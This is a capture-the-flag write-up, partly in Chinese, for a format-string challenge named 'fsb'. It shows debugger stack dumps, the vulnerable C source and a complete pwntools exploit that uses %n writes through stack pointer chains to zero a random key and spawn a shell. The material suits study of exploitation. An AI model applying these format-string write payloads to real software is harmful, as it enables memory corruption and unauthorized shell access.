# fsb

```
fsb@pwnable:~$ checksec fsb
[*] '/home/fsb/fsb'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```



參考 https://frozenkp.github.io/pwn/format_string/


這邊應該有三種做法
- read key
- write key
- hijack got 

alloca 會使 stack 位置不固定


buf buf2 key 都在 .bss

key 8 bytes

key 在 0x804a060，我們分兩次寫入 一次寫入 4 bytes

在 fsb 的記憶體狀態，發現有指標的東西，標記如下

無法利用一般的攻擊，因為buf寫入是在 .bss，printf 讀不到

但是因為 fsb 程式碼裡面，有做指標的操作，有stack指向stack，可以利用類似 argv chain 的方法做攻擊


```
*EAX  0xffffd164 —▸ 0xffffd2f4 —▸ 0x6d6f682f ◂— 0x0
*EBX  0xffffd0b0 ◂— 0x1
*ECX  0x804a060 (key) —▸ 0x9181c642 ◂— 0x0
*EDX  0xe
 EDI  0x2aaa9b80 (_rtld_global_ro) ◂— 0x0
 ESI  0xffffd164 —▸ 0xffffd2f4 —▸ 0x6d6f682f ◂— 0x0
*EBP  0xfffece08 —▸ 0xffffd098 —▸ 0x2aaaa020 (_rtld_global) —▸ 0x2aaaaa40 ◂— 0x0
*ESP  0xfffecdc0 ◂— 0x0
*EIP  0x804853a (fsb+6) —▸ 0x70dc45c7 ◂— 0x0
──────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────────────────────────
 ► 0x804853a <fsb+6>     mov    dword ptr [ebp - 0x24], 0x8048870
   0x8048541 <fsb+13>    mov    dword ptr [ebp - 0x20], 0
   0x8048548 <fsb+20>    lea    eax, [ebp + 8]
   0x804854b <fsb+23>    mov    dword ptr [ebp - 0x10], eax
   0x804854e <fsb+26>    lea    eax, [ebp + 0xc]
   0x8048551 <fsb+29>    mov    dword ptr [ebp - 0xc], eax
   0x8048554 <fsb+32>    mov    eax, dword ptr [ebp + 8]
   0x8048557 <fsb+35>    mov    dword ptr [ebp - 0x18], eax
   0x804855a <fsb+38>    jmp    fsb+74                     <fsb+74>
    ↓
   0x804857e <fsb+74>    mov    eax, dword ptr [ebp - 0x18]
   0x8048581 <fsb+77>    mov    eax, dword ptr [eax]
──────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xfffecdc0 ◂— 0x0
... ↓        7 skipped
────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────
 ► 0 0x804853a fsb+6
   1 0x8048791 main+178
   2 0x2a821519 __libc_start_call_main+121
   3 0x2a8215f3 __libc_start_main+147
   4 0x80484a1 _start+33
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x /30x $esp
0xfffecdc0:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffecdd0:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffecde0:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffecdf0:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffece00:     0x00000000      0x00000000      0xffffd098      0x08048791
0xfffece10:     0xffffd164      0xffffd16c      0x00000000      0x00000000
0xfffece20:     0x00000000      0x00000000      0x00000000      0x00000000
0xfffece30:     0x00000000      0x00000000


pwndbg> stack 20
00:0000│ esp 0xfffecdc0 ◂— 0x0
... ↓        8 skipped
09:0024│     0xfffecde4 —▸ 0x8048870 —▸ 0x6e69622f ◂— 0x0
0a:0028│     0xfffecde8 ◂— 0x0
0b:002c│     0xfffecdec ◂— 0x0
0c:0030│     0xfffecdf0 —▸ 0xffffd164 —▸ 0xffffd2f4 —▸ 0x6d6f682f ◂— 0x0
0d:0034│     0xfffecdf4 ◂— 0x0

---------------------------------- here
0e:0038│     0xfffecdf8 —▸ 0xfffece10 —▸ 0xffffd164 —▸ 0xffffd2f4 —▸ 0x6d6f682f ◂— ...
0f:003c│     0xfffecdfc —▸ 0xfffece14 —▸ 0xffffd16c —▸ 0xffffd318 —▸ 0x4c454853 ◂— ...
----------------------------------

10:0040│     0xfffece00 ◂— 0x0
11:0044│     0xfffece04 ◂— 0x0
12:0048│ ebp 0xfffece08 —▸ 0xffffd098 —▸ 0x2aaaa020 (_rtld_global) —▸ 0x2aaaaa40 ◂— 0x0
13:004c│     0xfffece0c —▸ 0x8048791 (main+178) ◂— mov eax, 0
```





這邊可以觀察到 他參數放到 stack 再去 call 
```
.text:08048710                 mov     dword ptr [esp+8], 8 ; nbytes
.text:08048718                 mov     dword ptr [esp+4], offset key ; buf
.text:08048720                 mov     eax, [ebp+fd]
.text:08048723                 mov     [esp], eax      ; fd
.text:08048726                 call    _read
```

這邊是 32 bit ，所以這邊 fsb read 第一個就是 stack 了

而如果是 64bit ，呼叫參數先放到 register ，多得再放到 stack 上，所以第一個讀取會先讀到 register

**上面下面的 gdb 是不同次的執行，不要被記憶體位置誤導**

我們要先把要寫的地址(key address)放到 stack 上，又因為 printf 寫入是要靠你給定位置的值當成位置寫入，就是指標



```                          
            14                          寫入key地址
0e:0038│     0xff9d3178 —▸ 0xff9d3190 —▸ 0x804a060 (key) 
            15                          寫入key+4地址
0f:003c│     0xff9d317c —▸ 0xff9d3194 —▸ 0x804a064 (key+4) 
```

之後再寫入 key , key+4 = 0
```
                              20                         寫入 0
0e:0038│     0xff9d3178 —▸ 0xff9d3190 —▸ 0x804a060 (key) ◂— 0x0
                            21                              寫入 0
0f:003c│     0xff9d317c —▸ 0xff9d3194 —▸ 0x804a064 (key+4) ◂— 0x0
```


寫完的記憶體

```
pwndbg> stack 20
00:0000│ esp 0xff9d3140 ◂— 0x0
01:0004│     0xff9d3144 —▸ 0x804a080 (buf2) ◂— 0xa30 /* '0\n' */
02:0008│     0xff9d3148 ◂— 0x64 /* 'd' */
03:000c│     0xff9d314c ◂— 0x0
... ↓        5 skipped
09:0024│     0xff9d3164 —▸ 0x8048870 ◂— das  /* '/bin/sh' */
0a:0028│     0xff9d3168 ◂— 0x0
0b:002c│     0xff9d316c ◂— 0x4
0c:0030│     0xff9d3170 —▸ 0xff9e3694 ◂— 0x0
0d:0034│     0xff9d3174 —▸ 0xff9e5ff1 ◂— 0x662f2e00
====================================
0e:0038│     0xff9d3178 —▸ 0xff9d3190 —▸ 0x804a060 (key) ◂— 0x0
0f:003c│     0xff9d317c —▸ 0xff9d3194 —▸ 0x804a064 (key+4) ◂— 0x0
====================================
10:0040│     0xff9d3180 ◂— 0x0
11:0044│     0xff9d3184 ◂— 0x0
12:0048│ ebp 0xff9d3188 —▸ 0xff9e3518 —▸ 0xf7fd5020 (_rtld_global) —▸ 0xf7fd5a40 ◂— 0x0
13:004c│     0xff9d318c —▸ 0x8048791 (main+178) ◂— mov eax, 0
pwndbg> x /30x $esp
0xff9d3140:     0x00000000      0x0804a080      0x00000064      0x00000000
0xff9d3150:     0x00000000      0x00000000      0x00000000      0x00000000
0xff9d3160:     0x00000000      0x08048870      0x00000000      0x00000004
0xff9d3170:     0xff9e3694      0xff9e5ff1      0xff9d3190      0xff9d3194
0xff9d3180:     0x00000000      0x00000000      0xff9e3518      0x08048791
0xff9d3190:     0x0804a060      0x0804a064      0x00000000      0x00000000
0xff9d31a0:     0x00000000      0x00000000  
```


```python
from pwn import *

p = process("/home/fsb/fsb")

print(p.recvuntil(")"))
p.sendline("%134520928x%14$n") # 0x804A060
p.recvuntil(")")
p.sendline("%134520932x%15$n") # 0x804A064
p.recvuntil(")")
p.sendline("%20$n\x00")
p.recvuntil(")")
p.sendline("%21$n\x00")
print(p.recvuntil("key :"))
p.sendline("0")
print(p.recvuntil("Congratz"))
p.interactive()
```


```c 
#include <stdio.h>
#include <alloca.h>
#include <fcntl.h>

unsigned long long key;
char buf[100];
char buf2[100];

int fsb(char** argv, char** envp){
        char* args[]={"/bin/sh", 0};
        int i;

        char*** pargv = &argv;
        char*** penvp = &envp;
        char** arg;
        char* c;
        for(arg=argv;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
        for(arg=envp;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
        *pargv=0;
        *penvp=0;

        for(i=0; i<4; i++){
                printf("Give me some format strings(%d)\n", i+1);
                read(0, buf, 100);
                printf(buf);
        }

        printf("Wait a sec...\n");
        sleep(3);

        printf("key : \n");
        read(0, buf2, 100);
        unsigned long long pw = strtoull(buf2, 0, 10);
        if(pw == key){
                printf("Congratz!\n");
                execve(args[0], args, 0);
                return 0;
        }

        printf("Incorrect key \n");
        return 0;
}

int main(int argc, char* argv[], char** envp){

        int fd = open("/dev/urandom", O_RDONLY);
        if( fd==-1 || read(fd, &key, 8) != 8 ){
                printf("Error, tell admin\n");
                return 0;
        }
        close(fd);

        alloca(0x12345 & key);

        fsb(argv, envp); // exploit this format string bug!
        return 0;
}
```